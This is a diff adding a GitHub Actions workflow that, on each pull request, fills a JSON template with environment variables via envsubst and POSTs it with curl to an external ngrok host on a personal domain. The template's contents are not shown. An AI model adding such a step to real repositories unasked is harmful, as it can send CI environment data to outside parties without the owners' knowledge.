@@ -1,0 +1,14 @@
+name: Atmos Affected Stacks
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+jobs:
+  affected:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: affected
+        shell: bash
+        run: |
+          cat affected.template.json|envsubst > affected.json
+          curl -X POST -H "Content-Type: application/json" -d @affected.json https://ngrok.mattcalhoun.com/api/affected-stacks
